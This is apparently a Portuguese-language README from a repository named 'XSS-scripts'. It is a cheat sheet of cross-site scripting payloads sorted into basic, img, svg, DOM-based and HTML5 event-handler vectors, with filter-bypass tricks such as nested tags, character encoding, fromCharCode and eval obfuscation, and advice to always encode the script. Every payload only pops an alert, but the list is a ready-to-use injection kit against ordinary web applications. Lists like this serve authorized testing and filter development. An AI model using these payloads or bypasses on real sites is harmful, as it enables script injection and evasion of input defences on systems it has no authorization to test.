# XSS-scripts
Vários scripts voltados a exploração da vulnerabilidade XSS

OBS > SEMPREEEE ENCONDEEEE O SCRIPT

Posivel BYPASS - Trocar o (.) por > %2f

# XSS-Html

// Basic payload
<script>alert('XSS')</script>

<scr<script>ipt>alert('XSS')</scr<script>ipt>
  
"><script>alert('XSS')</script>
  
"><script>alert(String.fromCharCode(88,83,83))</script>
  
<script>\u0061lert('22')</script>
  
<script>eval('\x61lert(\'33\')')</script>
  
<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
  
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">

// Img payload
<img src=x onerror=alert('XSS');>
  
<img src=x onerror=alert('XSS')//
     
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
  
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
  
<img src=x:alert(alt) onerror=eval(src) alt=xss>
  
"><img src=x onerror=alert('XSS');>
  
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>

// Svg payload
  
<svgonload=alert(1)>
  
<svg/onload=alert('XSS')>
  
<svg onload=alert(1)//
     
<svg/onload=alert(String.fromCharCode(88,83,83))>
  
<svg id=alert(1) onload=eval(id)>
  
"><svg/onload=alert(String.fromCharCode(88,83,83))>
  
"><svg/onload=alert(/XSS/)
              
<svg><script href=data:,alert(1) />(test)
  
<svg><script>alert('33')
  
<svg><script>alert&lpar;'33'&rpar;
  
# DomBased XSS
  // obs: Utilizar a extensão DOM Invader
  
123#"><img src=/ onerror=alert(2)>123

# XSS Html 5

<body onload=alert(/XSS/.source)>
  
<input autofocus onfocus=alert(1)>
  
<select autofocus onfocus=alert(1)>
  
<textarea autofocus onfocus=alert(1)>
  
<keygen autofocus onfocus=alert(1)>
  
<video/poster/onerror=alert(1)>
  
<video><source onerror="javascript:alert(1)">
  
<video src=_ onloadstart="alert(1)">
  
<details/open/ontoggle="alert`1`">
  
<audio src onloadstart=alert(1)>
  
<marquee onstart=alert(1)>
  
<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>

<body ontouchstart=alert(1)> //
  
<body ontouchend=alert(1)>   // 
  
<body ontouchmove=alert(1)>  // 



